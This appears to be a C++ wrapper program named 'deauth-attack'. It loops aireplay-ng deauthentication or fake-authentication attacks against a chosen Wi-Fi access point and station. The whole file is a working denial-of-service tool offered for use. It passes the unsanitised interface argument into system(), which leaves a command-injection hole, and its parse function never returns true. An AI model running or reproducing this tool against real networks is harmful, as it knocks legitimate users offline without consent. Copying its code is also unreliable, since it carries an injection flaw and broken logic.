#include <iostream>
#include <ctype.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <errno.h>

void myerror(const char* msg) {
    fprintf(stderr, "%s %s %d\n", msg, strerror(errno), errno);
}

void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB");
}

int isValidMacAddress(const char* mac) {
    if (strlen(mac) != 17) return 0;

    for (int i = 0; i < 17; i++) {
        if (i % 3 == 2) {
            if (mac[i] != ':') return 0;
        }
        else {
            if (!isxdigit(mac[i])) return 0;
        }
    }

    return 1;
}

struct Param {
    char* interface{nullptr};
    char* ap_mac{nullptr};
    char* station_mac{nullptr};
    bool auth{0};

    bool parse(int argc, char* argv[]) {
        if (argc < 3) return false;
        interface = argv[1];
        if (isValidMacAddress(argv[2]) == 1) ap_mac = argv[2];
        else return false;

        for (int i = 3; i < argc; i++) {
            if (i == 5) return false;

            if (i == 3) {
                if (isValidMacAddress(argv[3])) station_mac = argv[3];
                else return false;
                continue;
            }
            else {
                if (strcmp(argv[i], "-auth") == 0) auth = true;
                else return false;
            }
        }
    }
} param;

void executeCommand(const char* command) {
    int result = system(command);
    if (result == -1) {
        myerror("Failed to execute command");
    }
}

int main(int argc, char* argv[])
{
    if (!param.parse(argc, argv)) {
        usage();
        return -1;
    }

    char command[256];

    if (param.auth) {
        snprintf(command, sizeof(command), "aireplay-ng --fakeauth 0 -a %s -h %s %s", param.ap_mac, param.station_mac, param.interface);
    } else {
        if (param.station_mac) {
            snprintf(command, sizeof(command), "aireplay-ng --deauth 0 -a %s -c %s %s", param.ap_mac, param.station_mac, param.interface);
        } else {
            snprintf(command, sizeof(command), "aireplay-ng --deauth 0 -a %s %s", param.ap_mac, param.interface);
        }
    }

    while (true) {
        executeCommand(command);
        sleep(1); // Adjust sleep time as needed to avoid network disruption
    }

    return 0;
}
